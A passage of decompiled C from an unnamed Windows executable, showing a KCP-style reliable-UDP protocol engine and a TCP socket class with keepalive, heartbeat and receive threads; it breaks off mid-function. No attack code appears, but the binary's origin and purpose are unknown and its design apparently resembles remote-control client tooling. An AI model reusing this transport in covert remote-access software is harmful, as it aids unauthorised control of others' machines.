    if (*(int *)(unaff_ESI + 0xa4) != 0) {
      uVar2 = 0;
      if (*(int *)(unaff_ESI + 0xa8) != 0) {
        do {
          *(undefined4 *)((int)pvVar3 + uVar2 * 8) =
               *(undefined4 *)(*(int *)(unaff_ESI + 0xa4) + uVar2 * 8);
          *(undefined4 *)((int)pvVar3 + uVar2 * 8 + 4) =
               *(undefined4 *)(*(int *)(unaff_ESI + 0xa4) + 4 + uVar2 * 8);
          uVar2 = uVar2 + 1;
        } while (uVar2 < *(uint *)(unaff_ESI + 0xa8));
      }
      if (DAT_0041bd8c == (code *)0x0) {
        _free(*(void **)(unaff_ESI + 0xa4));
      }
      else {
        (*DAT_0041bd8c)();
      }
    }
    *(void **)(unaff_ESI + 0xa4) = pvVar3;
    *(uint *)(unaff_ESI + 0xac) = uVar4;
  }
  puVar1 = (undefined4 *)(*(int *)(unaff_ESI + 0xa4) + *(int *)(unaff_ESI + 0xa8) * 8);
  *puVar1 = param_1;
  puVar1[1] = param_2;
  *(int *)(unaff_ESI + 0xa8) = *(int *)(unaff_ESI + 0xa8) + 1;
  return;
}



/* Function: FUN_00402040 */

void __fastcall FUN_00402040(int *param_1)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int unaff_ESI;
  
  if ((-1 < (param_1[7] - *(int *)(unaff_ESI + 0x3c)) - *(int *)(unaff_ESI + 0x18)) ||
     (param_1[7] - *(int *)(unaff_ESI + 0x18) < 0)) {
    if (DAT_0041bd8c == (code *)0x0) {
      _free(param_1);
      return;
    }
    (*DAT_0041bd8c)();
    return;
  }
  piVar1 = (int *)(unaff_ESI + 0x9c);
  for (piVar2 = *(int **)(unaff_ESI + 0xa0); piVar2 != piVar1; piVar2 = (int *)piVar2[1]) {
    iVar3 = piVar2[7];
    iVar4 = param_1[7];
    if (iVar3 == iVar4) {
      if (DAT_0041bd8c == (code *)0x0) {
        _free(param_1);
      }
      else {
        (*DAT_0041bd8c)();
      }
      goto LAB_004020be;
    }
    if (iVar4 != iVar3 && -1 < iVar4 - iVar3) break;
  }
  *param_1 = (int)param_1;
  param_1[1] = (int)piVar2;
  *param_1 = *piVar2;
  *(int **)(*piVar2 + 4) = param_1;
  *piVar2 = (int)param_1;
  *(int *)(unaff_ESI + 0x5c) = *(int *)(unaff_ESI + 0x5c) + 1;
LAB_004020be:
  piVar2 = (int *)*piVar1;
  while (((piVar1 != piVar2 && (piVar2 = (int *)*piVar1, piVar2[7] == *(int *)(unaff_ESI + 0x18)))
         && (*(uint *)(unaff_ESI + 100) < *(uint *)(unaff_ESI + 0x3c)))) {
    *(int *)(*piVar2 + 4) = piVar2[1];
    *(int *)piVar2[1] = *piVar2;
    *piVar2 = 0;
    piVar2[1] = 0;
    *(int *)(unaff_ESI + 0x5c) = *(int *)(unaff_ESI + 0x5c) + -1;
    piVar2[1] = *(int *)(unaff_ESI + 0x90);
    *piVar2 = unaff_ESI + 0x8c;
    **(undefined4 **)(unaff_ESI + 0x90) = piVar2;
    *(int *)(unaff_ESI + 100) = *(int *)(unaff_ESI + 100) + 1;
    *(int *)(unaff_ESI + 0x18) = *(int *)(unaff_ESI + 0x18) + 1;
    *(int **)(unaff_ESI + 0x90) = piVar2;
    piVar2 = (int *)*piVar1;
  }
  return;
}



/* Function: FUN_00402140 */

undefined4 __cdecl FUN_00402140(int *param_1,int param_2,int param_3)

{
  byte bVar1;
  char cVar2;
  ushort uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  size_t _Size;
  uint uVar8;
  bool bVar9;
  int iVar10;
  int iVar11;
  int *piVar12;
  uint uVar13;
  int *extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  uint uVar14;
  int local_10;
  
  iVar4 = param_1[4];
  local_10 = 0;
  bVar9 = false;
  if (((*(byte *)(param_1 + 0x32) & 2) != 0) && (param_1[0x34] != 0)) {
    FUN_00401610(2,"[RI] %d bytes");
  }
  if ((param_2 == 0) || (param_3 < 0x18)) {
    return 0xffffffff;
  }
  do {
    bVar1 = *(byte *)(param_2 + 5);
    iVar10 = *param_1;
    iVar5 = *(int *)(param_2 + 0xc);
    iVar6 = *(int *)(param_2 + 0x10);
    uVar3 = *(ushort *)(param_2 + 6);
    iVar7 = *(int *)(param_2 + 8);
    cVar2 = *(char *)(param_2 + 4);
    _Size = *(size_t *)(param_2 + 0x14);
    if ((param_3 + -0x18 < (int)_Size) || ((int)_Size < 0)) {
      return 0xfffffffe;
    }
    if ((((cVar2 != 'Q') && (cVar2 != 'R')) && (cVar2 != 'S')) && (cVar2 != 'T')) {
      return 0xfffffffd;
    }
    param_1[0x10] = (uint)uVar3;
    FUN_00401ec0(iVar6);
    piVar12 = (int *)param_1[0x25];
    if (piVar12 == param_1 + 0x25) {
      param_1[4] = param_1[5];
    }
    else {
      param_1[4] = piVar12[7];
    }
    if (cVar2 == 'R') {
      if (-1 < param_1[0x13] - iVar7) {
        FUN_00401db0((int)param_1);
        piVar12 = extraout_ECX;
      }
      FUN_00401e40(piVar12,iVar5);
      if ((int *)param_1[0x25] == param_1 + 0x25) {
        param_1[4] = param_1[5];
      }
      else {
        param_1[4] = ((int *)param_1[0x25])[7];
      }
      if (bVar9) {
        if (iVar5 != local_10 && -1 < iVar5 - local_10) goto LAB_00402289;
      }
      else {
        bVar9 = true;
LAB_00402289:
        local_10 = iVar5;
      }
      iVar10 = FUN_00401680(0x20);
      if (iVar10 != 0) {
        FUN_00401610(0x20,"input ack: sn=%lu rtt=%ld rto=%ld");
      }
    }
    else if (cVar2 == 'Q') {
      iVar11 = FUN_00401680(0x10);
      if (iVar11 != 0) {
        FUN_00401610(extraout_ECX_00,"input psh: sn=%lu ts=%lu");
      }
      if (((iVar5 - param_1[0xf]) - param_1[6] < 0) &&
         (FUN_00401f60(iVar5,iVar7), -1 < iVar5 - param_1[6])) {
        if (DAT_0041bd88 == (code *)0x0) {
          piVar12 = (int *)_malloc(_Size + 0x3c);
        }
        else {
          piVar12 = (int *)(*DAT_0041bd88)();
        }
        piVar12[2] = iVar10;
        piVar12[4] = (uint)bVar1;
        piVar12[5] = (uint)uVar3;
        piVar12[3] = 0x51;
        piVar12[6] = iVar7;
        piVar12[7] = iVar5;
        piVar12[8] = iVar6;
        piVar12[9] = _Size;
        if (_Size != 0) {
          FID_conflict__memcpy(piVar12 + 0xe,(void *)(param_2 + 0x18),_Size);
        }
        FUN_00402040(piVar12);
      }
    }
    else if (cVar2 == 'S') {
      param_1[0x12] = param_1[0x12] | 2;
      iVar10 = FUN_00401680(0x40);
      if (iVar10 != 0) {
        FUN_00401610(extraout_ECX_01,"input probe");
      }
    }
    else {
      if (cVar2 != 'T') {
        return 0xfffffffd;
      }
      iVar10 = FUN_00401680(0x80);
      if (iVar10 != 0) {
        FUN_00401610(extraout_ECX_02,"input wins: %lu");
      }
    }
    param_2 = param_2 + 0x18 + _Size;
    param_3 = (param_3 + -0x18) - _Size;
    if (param_3 < 0x18) {
      if (bVar9) {
        FUN_00401f20();
      }
      if (param_1[4] != iVar4 && -1 < param_1[4] - iVar4) {
        uVar13 = param_1[0x11];
        uVar14 = param_1[0x10];
        if (uVar13 < uVar14) {
          uVar8 = param_1[2];
          if (uVar13 < (uint)param_1[9]) {
            param_1[0x20] = param_1[0x20] + uVar8;
            param_1[0x11] = uVar13 + 1;
          }
          else {
            if ((uint)param_1[0x20] < uVar8) {
              param_1[0x20] = uVar8;
            }
            uVar14 = (uVar13 + 1) * uVar8;
            uVar13 = (uVar8 * uVar8) / (uint)param_1[0x20] + param_1[0x20] + (uVar8 >> 4);
            param_1[0x20] = uVar13;
            if (uVar14 < uVar13 || uVar14 - uVar13 == 0) {
              uVar14 = uVar8;
              if (uVar8 == 0) {
                uVar14 = 1;
              }
              param_1[0x11] = ((uVar13 - 1) + uVar8) / uVar14;
            }
            uVar14 = param_1[0x10];
          }
          if (uVar14 < (uint)param_1[0x11]) {
            param_1[0x11] = uVar14;
            param_1[0x20] = uVar14 * uVar8;
          }
        }
      }
      return 0;
    }
  } while( true );
}



/* Function: FUN_004024b0 */

void FUN_004024b0(void)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  bool bVar4;
  int *in_EAX;
  int iVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  int iVar9;
  int iVar10;
  int *piVar11;
  int *_Dst;
  int local_4c;
  int local_48;
  int local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  int local_10;
  
  iVar1 = in_EAX[0x13];
  piVar2 = (int *)in_EAX[0x2d];
  local_18 = 0;
  bVar4 = false;
  if (in_EAX[0x1c] != 0) {
    iVar7 = *in_EAX;
    if ((uint)in_EAX[0x19] < (uint)in_EAX[0xf]) {
      local_10 = in_EAX[0xf] - in_EAX[0x19];
    }
    else {
      local_10 = 0;
    }
    iVar3 = in_EAX[6];
    iVar10 = in_EAX[0x2a];
    iVar9 = 0;
    local_48 = 0;
    local_4c = 0;
    _Dst = piVar2;
    if (0 < iVar10) {
      do {
        iVar5 = (int)_Dst - (int)piVar2;
        if (in_EAX[1] < iVar5 + 0x18) {
          if (((*(byte *)(in_EAX + 0x32) & 1) != 0) && (in_EAX[0x34] != 0)) {
            FUN_00401610(1,"[RO] %ld bytes");
          }
          _Dst = piVar2;
          if (iVar5 != 0) {
            (*(code *)in_EAX[0x33])(piVar2,iVar5);
          }
        }
        piVar11 = (int *)(in_EAX[0x29] + iVar9 * 8);
        local_48 = *piVar11;
        local_4c = piVar11[1];
        *_Dst = iVar7;
        *(undefined2 *)(_Dst + 1) = 0x52;
        *(undefined2 *)((int)_Dst + 6) = (undefined2)local_10;
        _Dst[2] = local_4c;
        _Dst[3] = local_48;
        _Dst[4] = iVar3;
        _Dst[5] = 0;
        iVar9 = iVar9 + 1;
        _Dst = _Dst + 6;
      } while (iVar9 < iVar10);
    }
    in_EAX[0x2a] = 0;
    if (in_EAX[0x10] == 0) {
      if (in_EAX[0x1e] == 0) {
        in_EAX[0x1e] = 7000;
        in_EAX[0x1d] = in_EAX[0x13] + 7000;
      }
      else if (-1 < in_EAX[0x13] - in_EAX[0x1d]) {
        if ((uint)in_EAX[0x1e] < 7000) {
          in_EAX[0x1e] = 7000;
        }
        uVar6 = in_EAX[0x1e] + ((uint)in_EAX[0x1e] >> 1);
        in_EAX[0x1e] = uVar6;
        if (120000 < uVar6) {
          in_EAX[0x1e] = 120000;
        }
        in_EAX[0x12] = in_EAX[0x12] | 1;
        in_EAX[0x1d] = in_EAX[0x1e] + in_EAX[0x13];
      }
    }
    else {
      in_EAX[0x1d] = 0;
      in_EAX[0x1e] = 0;
    }
    if ((*(byte *)(in_EAX + 0x12) & 1) != 0) {
      iVar10 = (int)_Dst - (int)piVar2;
      if (in_EAX[1] < iVar10 + 0x18) {
        if (((*(byte *)(in_EAX + 0x32) & 1) != 0) && (in_EAX[0x34] != 0)) {
          FUN_00401610(1,"[RO] %ld bytes");
        }
        _Dst = piVar2;
        if (iVar10 != 0) {
          (*(code *)in_EAX[0x33])(piVar2,iVar10);
        }
      }
      *_Dst = iVar7;
      *(undefined2 *)(_Dst + 1) = 0x53;
      *(undefined2 *)((int)_Dst + 6) = (undefined2)local_10;
      _Dst[2] = local_4c;
      _Dst[3] = local_48;
      _Dst[4] = iVar3;
      _Dst[5] = 0;
      _Dst = _Dst + 6;
    }
    if ((*(byte *)(in_EAX + 0x12) & 2) != 0) {
      iVar10 = (int)_Dst - (int)piVar2;
      if (in_EAX[1] < iVar10 + 0x18) {
        if (((*(byte *)(in_EAX + 0x32) & 1) != 0) && (in_EAX[0x34] != 0)) {
          FUN_00401610(1,"[RO] %ld bytes");
        }
        _Dst = piVar2;
        if (iVar10 != 0) {
          (*(code *)in_EAX[0x33])(piVar2,iVar10);
        }
      }
      *_Dst = iVar7;
      *(undefined2 *)(_Dst + 1) = 0x54;
      *(undefined2 *)((int)_Dst + 6) = (undefined2)local_10;
      _Dst[2] = local_4c;
      _Dst[3] = local_48;
      _Dst[4] = iVar3;
      _Dst[5] = 0;
      _Dst = _Dst + 6;
    }
    local_20 = in_EAX[0x10];
    in_EAX[0x12] = 0;
    if ((uint)in_EAX[0xe] <= local_20) {
      local_20 = in_EAX[0xe];
    }
    if ((in_EAX[0x30] == 0) && ((uint)in_EAX[0x11] <= local_20)) {
      local_20 = in_EAX[0x11];
    }
    iVar7 = (in_EAX[5] - in_EAX[4]) - local_20;
    while ((iVar7 < 0 && (piVar11 = (int *)in_EAX[0x21], in_EAX + 0x21 != piVar11))) {
      *(int *)(*piVar11 + 4) = piVar11[1];
      *(int *)piVar11[1] = *piVar11;
      *piVar11 = 0;
      piVar11[1] = 0;
      piVar11[1] = in_EAX[0x26];
      *piVar11 = (int)(in_EAX + 0x25);
      *(int **)in_EAX[0x26] = piVar11;
      in_EAX[0x1a] = in_EAX[0x1a] + -1;
      in_EAX[0x18] = in_EAX[0x18] + 1;
      iVar7 = *in_EAX;
      in_EAX[0x26] = (int)piVar11;
      piVar11[5] = local_10;
      piVar11[2] = iVar7;
      piVar11[3] = 0x51;
      piVar11[6] = iVar1;
      piVar11[7] = in_EAX[5];
      in_EAX[5] = in_EAX[5] + 1;
      piVar11[8] = in_EAX[6];
      piVar11[10] = iVar1;
      piVar11[0xb] = in_EAX[0xc];
      piVar11[0xc] = 0;
      piVar11[0xd] = 0;
      iVar7 = (in_EAX[5] - in_EAX[4]) - local_20;
    }
    local_1c = in_EAX[0x2e];
    if ((int)local_1c < 1) {
      local_1c = 0xffffffff;
    }
    if (in_EAX[0x1b] == 0) {
      local_24 = in_EAX[0xc] >> 3;
    }
    else {
      local_24 = 0;
    }
    piVar11 = (int *)in_EAX[0x25];
    if (piVar11 != in_EAX + 0x25) {
      do {
        iVar7 = piVar11[0xd];
        if (iVar7 == 0) {
          piVar11[0xd] = 1;
          iVar7 = in_EAX[0xc];
          piVar11[0xb] = iVar7;
          iVar7 = iVar7 + local_24 + iVar1;
LAB_004028f3:
          piVar11[10] = iVar7;
          piVar11[5] = local_10;
          piVar11[6] = iVar1;
          piVar11[8] = in_EAX[6];
          iVar7 = (int)_Dst - (int)piVar2;
          if (in_EAX[1] < iVar7 + 0x18 + piVar11[9]) {
            if (((*(byte *)(in_EAX + 0x32) & 1) != 0) && (in_EAX[0x34] != 0)) {
              FUN_00401610(1,"[RO] %ld bytes");
            }
            _Dst = piVar2;
            if (iVar7 != 0) {
              (*(code *)in_EAX[0x33])(piVar2,iVar7);
            }
          }
          *_Dst = piVar11[2];
          *(char *)(_Dst + 1) = (char)piVar11[3];
          *(char *)((int)_Dst + 5) = (char)piVar11[4];
          *(short *)((int)_Dst + 6) = (short)piVar11[5];
          _Dst[2] = piVar11[6];
          _Dst[3] = piVar11[7];
          _Dst[4] = piVar11[8];
          _Dst[5] = piVar11[9];
          _Dst = _Dst + 6;
          if (piVar11[9] != 0) {
            FID_conflict__memcpy(_Dst,piVar11 + 0xe,piVar11[9]);
            _Dst = (int *)((int)_Dst + piVar11[9]);
          }
          if ((uint)in_EAX[0x1f] <= (uint)piVar11[0xd]) {
            in_EAX[3] = -1;
          }
        }
        else {
          if (-1 < iVar1 - piVar11[10]) {
            piVar11[0xd] = iVar7 + 1;
            in_EAX[0x16] = in_EAX[0x16] + 1;
            if (in_EAX[0x1b] == 0) {
              uVar6 = piVar11[0xb];
              uVar8 = in_EAX[0xc];
              if ((uint)in_EAX[0xc] <= uVar6) {
                uVar8 = uVar6;
              }
              piVar11[0xb] = uVar6 + uVar8;
              iVar7 = uVar6 + uVar8 + iVar1;
              bVar4 = true;
            }
            else {
              if ((uint)in_EAX[0x1b] < 2) {
                iVar7 = piVar11[0xb];
              }
              else {
                iVar7 = in_EAX[0xc];
              }
              piVar11[0xb] = piVar11[0xb] + iVar7 / 2;
              iVar7 = piVar11[0xb] + iVar1;
              bVar4 = true;
            }
            goto LAB_004028f3;
          }
          if ((local_1c <= (uint)piVar11[0xc]) && ((iVar7 <= in_EAX[0x2f] || (in_EAX[0x2f] < 1)))) {
            piVar11[0xd] = iVar7 + 1;
            iVar7 = piVar11[0xb] + iVar1;
            local_18 = local_18 + 1;
            piVar11[0xc] = 0;
            goto LAB_004028f3;
          }
        }
        piVar11 = (int *)*piVar11;
      } while (piVar11 != in_EAX + 0x25);
    }
    if (0 < (int)_Dst - (int)piVar2) {
      if (((*(byte *)(in_EAX + 0x32) & 1) != 0) && (in_EAX[0x34] != 0)) {
        FUN_00401610(1,"[RO] %ld bytes");
      }
      (*(code *)in_EAX[0x33])(piVar2,(int)_Dst - (int)piVar2);
    }
    if (local_18 != 0) {
      uVar6 = (uint)(in_EAX[5] - in_EAX[4]) >> 1;
      in_EAX[9] = uVar6;
      if (uVar6 < 2) {
        in_EAX[9] = 2;
      }
      in_EAX[0x11] = in_EAX[9] + local_1c;
      in_EAX[0x20] = in_EAX[2] * (in_EAX[9] + local_1c);
    }
    if (bVar4) {
      in_EAX[9] = local_20 >> 1;
      if (local_20 >> 1 < 2) {
        in_EAX[9] = 2;
      }
      in_EAX[0x11] = 1;
      in_EAX[0x20] = in_EAX[2];
    }
    if (in_EAX[0x11] == 0) {
      in_EAX[0x11] = 1;
      in_EAX[0x20] = in_EAX[2];
    }
  }
  return;
}



/* Function: FUN_00402aa0 */

void __fastcall FUN_00402aa0(int param_1)

{
  int in_EAX;
  int iVar1;
  
  *(int *)(in_EAX + 0x4c) = param_1;
  if (*(int *)(in_EAX + 0x70) == 0) {
    *(undefined4 *)(in_EAX + 0x70) = 1;
    *(int *)(in_EAX + 0x54) = param_1;
  }
  iVar1 = param_1 - *(int *)(in_EAX + 0x54);
  if ((iVar1 < 10000) && (-0x2711 < iVar1)) {
    if (iVar1 < 0) {
      return;
    }
  }
  else {
    *(int *)(in_EAX + 0x54) = param_1;
  }
  *(int *)(in_EAX + 0x54) = *(int *)(in_EAX + 0x54) + *(int *)(in_EAX + 0x50);
  if (-1 < param_1 - *(int *)(in_EAX + 0x54)) {
    *(int *)(in_EAX + 0x54) = *(int *)(in_EAX + 0x50) + param_1;
  }
  FUN_004024b0();
  return;
}



/* Function: FUN_00402af0 */

undefined4 FUN_00402af0(void)

{
  code *pcVar1;
  int in_EAX;
  void *pvVar2;
  int unaff_EDI;
  
  if ((in_EAX < 0x32) || (in_EAX < 0x18)) {
    return 0xffffffff;
  }
  if (DAT_0041bd88 == (code *)0x0) {
    pvVar2 = _malloc(in_EAX * 3 + 0x48);
  }
  else {
    pvVar2 = (void *)(*DAT_0041bd88)();
  }
  pcVar1 = DAT_0041bd8c;
  if (pvVar2 == (void *)0x0) {
    return 0xfffffffe;
  }
  *(int *)(unaff_EDI + 4) = in_EAX;
  *(int *)(unaff_EDI + 8) = in_EAX + -0x18;
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
    *(void **)(unaff_EDI + 0xb4) = pvVar2;
    return 0;
  }
  _free(*(void **)(unaff_EDI + 0xb4));
  *(void **)(unaff_EDI + 0xb4) = pvVar2;
  return 0;
}



/* Function: FUN_00402b70 */

void FUN_00402b70(void)

{
  return;
}



/* Function: FUN_00402b80 */

void FUN_00402b80(LONG *param_1)

{
  LONG LVar1;
  uint uVar2;
  
  uVar2 = 0;
  while (LVar1 = InterlockedCompareExchange(param_1,1,0), LVar1 != 0) {
    if ((uVar2 & 0xfff) == 0xfff) {
      SwitchToThread();
      uVar2 = uVar2 + 1;
    }
    else {
      uVar2 = uVar2 + 1;
    }
  }
  return;
}



/* Function: FUN_00402bd0 */

void __cdecl FUN_00402bd0(HANDLE *param_1)

{
  DWORD DVar1;
  int iVar2;
  tagMSG local_20;
  
  while (DVar1 = MsgWaitForMultipleObjects(1,param_1,0,0xffffffff,0x4ff), DVar1 == 1) {
    iVar2 = PeekMessageW(&local_20,(HWND)0x0,0,0,1);
    while (iVar2 != 0) {
      TranslateMessage(&local_20);
      DispatchMessageW(&local_20);
      iVar2 = PeekMessageW(&local_20,(HWND)0x0,0,0,1);
    }
  }
  return;
}



/* Function: FUN_00402c50 */

void FUN_00402c50(void)

{
  return;
}



/* Function: FUN_00402c60 */

void FUN_00402c60(void)

{
  HANDLE pvVar1;
  undefined4 *unaff_ESI;
  undefined1 *puStack_1ac;
  undefined1 auStack_1a4 [4];
  undefined1 local_1a0 [396];
  uint uStack_14;
  uint local_c;
  
  local_c = DAT_004191b4 ^ (uint)auStack_1a4;
  unaff_ESI[2] = 0;
  unaff_ESI[3] = 0;
  unaff_ESI[4] = 0;
  *unaff_ESI = CTcpSocket::vftable;
  unaff_ESI[0xe] = 0;
  unaff_ESI[0xc] = 0;
  unaff_ESI[0xd] = 0;
  unaff_ESI[0xb] = CBuffer::vftable;
  unaff_ESI[0xf] = CBuffer::vftable;
  unaff_ESI[0x12] = 0;
  unaff_ESI[0x10] = 0;
  unaff_ESI[0x11] = 0;
  unaff_ESI[0x13] = CBuffer::vftable;
  puStack_1ac = local_1a0;
  unaff_ESI[0x16] = 0;
  unaff_ESI[0x14] = 0;
  unaff_ESI[0x15] = 0;
  Ordinal_115(0x202);
  pvVar1 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,1,0,(LPCWSTR)0x0);
  unaff_ESI[1] = pvVar1;
  InterlockedExchange(unaff_ESI + 6,0);
  unaff_ESI[0x17] = 0;
  unaff_ESI[0x18] = 0;
  unaff_ESI[5] = 0;
  unaff_ESI[0x19] = 0xffffffff;
  __security_check_cookie(uStack_14 ^ (uint)&puStack_1ac);
  return;
}



/* Function: FUN_00402d10 */

void __fastcall FUN_00402d10(int param_1)

{
  undefined4 local_8;
  
  if (*(int *)(param_1 + 0x18) != 0) {
    local_8 = 1;
    Ordinal_21(*(undefined4 *)(param_1 + 100),0xffff,0x80,&local_8,4);
    CancelIo(*(HANDLE *)(param_1 + 100));
    InterlockedExchange((LONG *)(param_1 + 0x18),0);
    Ordinal_3(*(undefined4 *)(param_1 + 100));
    SetEvent(*(HANDLE *)(param_1 + 4));
    *(undefined4 *)(param_1 + 100) = 0xffffffff;
  }
  return;
}



/* Function: FUN_00402d80 */

/* WARNING: Type propagation algorithm not settling */

void __thiscall FUN_00402d80(void *this,LPCWSTR param_1,undefined4 param_2)

{
  DWORD DVar1;
  int iVar2;
  LPSTR pCVar3;
  uintptr_t uVar4;
  LPSTR pCVar5;
  int cbMultiByte;
  LPCSTR pCVar6;
  uint cbMultiByte_00;
  LPBOOL pBVar7;
  undefined1 local_40 [4];
  uint local_3c [5];
  undefined4 local_28;
  undefined2 local_24;
  undefined2 local_22;
  undefined4 local_20;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  ResetEvent(*(HANDLE *)((int)this + 4));
  InterlockedExchange((LONG *)((int)this + 0x18),0);
  DVar1 = timeGetTime();
  *(DWORD *)((int)this + 0x14) = DVar1;
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined4 *)((int)this + 0x24) = 0;
  *(undefined2 *)((int)this + 0x28) = 0;
  *(undefined4 *)((int)this + 0x20) = *(undefined4 *)((int)this + 0x14);
  *(undefined4 *)((int)this + 0x24) = *(undefined4 *)((int)this + 0x18);
  *(undefined2 *)((int)this + 0x28) = 0xca;
  iVar2 = Ordinal_23(2,1,6);
  *(int *)((int)this + 100) = iVar2;
  if (iVar2 == -1) {
    __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  pBVar7 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  cbMultiByte = 0;
  pCVar5 = (LPSTR)0x0;
  iVar2 = lstrlenW(param_1);
  local_3c[4] = WideCharToMultiByte(0,0,param_1,iVar2,pCVar5,cbMultiByte,pCVar6,pBVar7);
  pCVar3 = (LPSTR)FUN_004069bf(local_3c[4] + 1);
  pBVar7 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  pCVar5 = pCVar3;
  cbMultiByte_00 = local_3c[4];
  iVar2 = lstrlenW(param_1);
  WideCharToMultiByte(0,0,param_1,iVar2,pCVar5,cbMultiByte_00,pCVar6,pBVar7);
  pCVar3[local_3c[4]] = '\0';
  iVar2 = Ordinal_52(pCVar3);
  FUN_004069ca(pCVar3);
  if (iVar2 != 0) {
    local_24 = 2;
    local_22 = Ordinal_9(param_2);
    local_20 = *(undefined4 *)**(undefined4 **)(iVar2 + 0xc);
    iVar2 = Ordinal_4(*(undefined4 *)((int)this + 100),&local_24,0x10);
    if (iVar2 != -1) {
      local_28 = 0x40000;
      Ordinal_21(*(undefined4 *)((int)this + 100),0xffff,0x1001,&local_28,4);
      local_28 = 0x40000;
      Ordinal_21(*(undefined4 *)((int)this + 100),0xffff,0x1002,&local_28,4);
      local_3c[2] = 30000;
      Ordinal_21(*(undefined4 *)((int)this + 100),0xffff,0x1006,local_3c + 2,4);
      local_3c[1] = 1;
      iVar2 = Ordinal_21(*(undefined4 *)((int)this + 100),0xffff,8,local_3c + 1,4);
      if (iVar2 == 0) {
        local_14 = 1;
        local_10 = 180000;
        local_c = 5000;
        WSAIoctl(*(undefined4 *)((int)this + 100),0x98000004,&local_14,0xc,0,0,local_40,0,0);
      }
      InterlockedExchange((LONG *)((int)this + 0x18),1);
      local_3c[3] = 0;
      uVar4 = __beginthreadex((void *)0x0,0,FUN_00402fb0,this,0,local_3c + 3);
      *(uintptr_t *)((int)this + 0x5c) = uVar4;
      uVar4 = __beginthreadex((void *)0x0,0,FUN_004030c0,this,0,local_3c);
      *(uintptr_t *)((int)this + 0x60) = uVar4;
      __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: FUN_00402fb0 */

void FUN_00402fb0(undefined4 *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  size_t sVar3;
  int *piVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 local_210 [65];
  undefined4 local_10c [65];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  puVar1 = (undefined4 *)FUN_004069bf(0x40000);
  *puVar1 = 0;
  iVar2 = param_1[6];
  local_10c[1] = param_1[0x19];
  local_10c[0] = 1;
  puVar6 = local_10c;
  puVar7 = local_210;
  for (iVar5 = 0x41; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  do {
    puVar6 = puVar1;
    if (iVar2 == 0) {
LAB_00403075:
      if (puVar6 != (undefined4 *)0x0) {
        FUN_0040747b(puVar6);
      }
      local_210[0] = 0x403098;
      __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
    iVar2 = Ordinal_18(0,local_210,0,0,0);
    puVar6 = puVar1;
    if (iVar2 == -1) {
LAB_0040306d:
      (**(code **)*param_1)();
      goto LAB_00403075;
    }
    if (0 < iVar2) {
      sVar3 = Ordinal_16(param_1[0x19],puVar1,0x40000,0);
      if ((int)sVar3 < 1) {
        if ((-1 < (int)sVar3) ||
           (((piVar4 = __errno(), *piVar4 != 0xb && (piVar4 = __errno(), *piVar4 != 0x8c)) &&
            (piVar4 = __errno(), *piVar4 != 4)))) goto LAB_0040306d;
      }
      else {
        FUN_00403340((int)param_1,puVar1,sVar3);
      }
    }
    iVar2 = param_1[6];
    puVar1 = puVar6;
  } while( true );
}



/* Function: FUN_004030c0 */

undefined4 FUN_004030c0(int *param_1)

{
  DWORD DVar1;
  int iVar2;
  undefined1 local_5;
  
  iVar2 = param_1[6];
  do {
    if (iVar2 == 0) {
      return 0;
    }
    iVar2 = 0;
    do {
      if (param_1[6] == 0) {
        return 0;
      }
      Sleep(10);
      iVar2 = iVar2 + 1;
    } while (iVar2 < 1000);
    (**(code **)(*param_1 + 8))(&local_5,1);
    DVar1 = timeGetTime();
    if (60000 < DVar1 - param_1[5]) {
      if (param_1[6] == 0) {
        return 0;
      }
      (**(code **)*param_1)();
    }
    iVar2 = param_1[6];
  } while( true );
}



/* Function: FUN_00403140 */

undefined4 __thiscall FUN_00403140(void *this,void *param_1,size_t param_2)

{
  int *piVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  LONG LVar4;
  int iVar5;
  undefined4 extraout_ECX;
  
  DVar3 = GetCurrentThreadId();
  if (*(DWORD *)((int)this + 0xc) != DVar3) {
    do {
      LVar4 = InterlockedExchange((LONG *)((int)this + 8),1);
    } while (LVar4 == 1);
    *(DWORD *)((int)this + 0xc) = DVar3;
  }
  *(int *)((int)this + 0x10) = *(int *)((int)this + 0x10) + 1;
  FUN_00401100();
  **(int **)((int)this + 0x54) = param_2 + 0xe;
  *(int *)((int)this + 0x54) = *(int *)((int)this + 0x54) + 4;
  FUN_00401100();
  puVar2 = *(undefined4 **)((int)this + 0x54);
  *puVar2 = *(undefined4 *)((int)this + 0x20);
  puVar2[1] = *(undefined4 *)((int)this + 0x24);
  *(undefined2 *)(puVar2 + 2) = *(undefined2 *)((int)this + 0x28);
  *(int *)((int)this + 0x54) = *(int *)((int)this + 0x54) + 10;
  FUN_00401060(param_1,param_2,1,(int)this + 0x20);
  if (*(int *)((int)this + 0x50) == 0) {
    iVar5 = 0;
  }
  else {
    iVar5 = *(int *)((int)this + 0x54) - *(int *)((int)this + 0x50);
  }
  FUN_00403240((int)this,iVar5);
  *(undefined4 *)((int)this + 0x54) = *(undefined4 *)((int)this + 0x50);
  FUN_004011b0(extraout_ECX,0x400);
  DVar3 = GetCurrentThreadId();
  if (DVar3 == *(DWORD *)((int)this + 0xc)) {
    piVar1 = (int *)((int)this + 0x10);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
